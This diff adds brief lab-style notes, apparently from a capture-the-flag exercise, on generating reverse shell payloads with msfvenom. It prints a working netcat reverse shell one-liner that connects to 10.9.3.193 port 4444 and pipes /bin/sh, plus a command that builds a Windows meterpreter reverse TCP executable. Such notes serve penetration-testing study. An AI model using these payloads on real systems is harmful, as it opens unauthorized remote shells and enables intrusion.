@@ -1,0 +1,17 @@
+Msfvenom
+
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+Below what was generated:
+
+Payload size: 96 bytes
+mkfifo /tmp/tnhkhx; nc 10.9.3.193 4444 0</tmp/tnhkhx | /bin/sh >/tmp/tnhkhx 2>&1; rm /tmp/tnhkhx
+ 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe - this will generate a basic windows meterpreter reverse tcp shell
